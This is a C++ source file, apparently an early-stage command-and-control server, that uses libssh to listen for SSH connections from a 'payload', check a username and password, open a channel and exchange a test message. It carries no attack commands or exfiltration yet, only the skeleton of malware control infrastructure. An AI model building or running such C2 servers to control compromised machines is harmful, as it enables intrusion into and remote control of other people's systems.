//
// Created by rip on 6/30/19.
//

#include "C2Server.h"

// Public methods

C2Server::C2Server()
{
    std::cout << "[+] Creating C2 server...\n";

    // create the SSH bind object
    bind = ssh_bind_new();
    if (bind == nullptr)
    {
        std::cerr << "[-] Couldn't create SSH bind\n";
        exit(EXIT_FAILURE);
    }

    // configure the options
    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_BINDADDR, host.c_str());
    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_BINDPORT, &port);
    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_RSAKEY, KEYS_FOLDER "id_rsa");
}

C2Server::~C2Server()
{
    listenerThread.join();
    tearDown();
}

void C2Server::start()
{
    if (ssh_bind_listen(bind) < 0)
    {
        std::cerr << "[-] Error listening on socket: " << ssh_get_error(bind) << std::endl;
        tearDown();
        exit(EXIT_FAILURE);
    }
    std::cout << "[+] SSH server listening on " << host << ":" << port << "...\n";
    isListening = true;

    // wait for connections in a separate thread
    listenerThread = std::thread(&C2Server::listen, this);
}

void C2Server::stop()
{
    isListening = false;
    tearDown();
    std::cout << "[+] C2 server stopped.\n";
}

// Private Methods

void C2Server::listen()
{
    // accept incoming connections
    while (isListening)
    {
        // create new session
        session = ssh_new();
        if (session == nullptr)
        {
            std::cerr << "[-] Couldn't create SSH session\n";
            continue;
        }

        // block until there's a new incoming connection
        if (ssh_bind_accept(this->bind, session) != SSH_ERROR)
        {
            // we got a new connection
            handleConnection();
        }

        std::cout << "[+] Listening again...\n";
    }
}

void C2Server::handleConnection()
{
    std::cout << "[+] Exchanging SSH key...\n";
    if (ssh_handle_key_exchange(session)) {
        std::cerr << "[-] SSH key exchange error: " << std::string(ssh_get_error(session));
        stop();
        return;
    }

    // authenticate the connection
    std::cout << "[+] Authenticating payload...\n";
    if (!authenticate()) {
        std::cerr << "[-] Authentication failed - incorrect user or pwd\n";
        stop();
        return;
    }

    // get a communication channel to the client
    std::cout << "[+] Opening communication channel...\n";
    if (!openChannel())
    {
        std::cerr << "[-] Session closed without opening a channel\n";
        tearDown();
        return;
    }

    // main loop for communication
    while (true)
    {
        // test communication
        auto msg = "helloWorld";
        std::cout << "[+] Sending message to payload: " << msg << std::endl;
        sendMsg(msg);
        std::cout << "[+] Got response from payload: " << rcvMsg() << std::endl;
        break;
    }
}

void C2Server::tearDown()
{
    // stop listening if not stopped yet
    isListening = false;

    // free all the objects
    if (channel != nullptr)
    {
        if (ssh_channel_is_open(channel))
        {
            ssh_channel_send_eof(channel);
            ssh_channel_close(channel);
        }
        ssh_channel_free(channel);
    }
    if (session != nullptr)
    {
        ssh_free(session);
    }
    if (bind != nullptr)
    {
        ssh_bind_free(bind);
        ssh_finalize();
    }
}

bool C2Server::authenticate()
{
    ssh_message msg;
    while ((msg = ssh_message_get(session)))
    {
        if (ssh_message_type(msg) == SSH_REQUEST_AUTH && ssh_message_subtype(msg) == SSH_AUTH_METHOD_PASSWORD)
        {
            if (ssh_message_auth_user(msg) == user && ssh_message_auth_password(msg) == pwd)
            {
                // send back successful auth message
                ssh_message_auth_reply_success(msg, 0);
                ssh_message_free(msg);
                return true;
            }
        }

        // not authenticated, return default message
        ssh_message_auth_set_methods(msg, SSH_AUTH_METHOD_PASSWORD);
        ssh_message_reply_default(msg);
        ssh_message_free(msg);
    }
    return false;
}

bool C2Server::openChannel()
{
    ssh_message msg;
    while ((msg = ssh_message_get(session)))
    {
        if (ssh_message_type(msg) == SSH_REQUEST_CHANNEL_OPEN && ssh_message_subtype(msg) == SSH_CHANNEL_SESSION)
        {
            // channel opened
            channel = ssh_message_channel_request_open_reply_accept(msg);
            ssh_message_free(msg);
            return true;
        }
        ssh_message_reply_default(msg);
        ssh_message_free(msg);
    }
    return false;
}

void C2Server::sendMsg(const std::string& msg)
{
    if ((ssh_channel_write(channel, msg.c_str(), (unsigned int) strlen(msg.c_str()))) == SSH_ERROR)
    {
        std::cerr << "[-] Error while writing to channel\n";
    }
}

std::string C2Server::rcvMsg()
{
    char buffer[1024] { 0 };
    if ((ssh_channel_read(channel, buffer, sizeof(buffer), 0)) <= 0)
    {
        std::cerr << "[-] Error while reading from channel\n";
    }
    return std::string(buffer);
}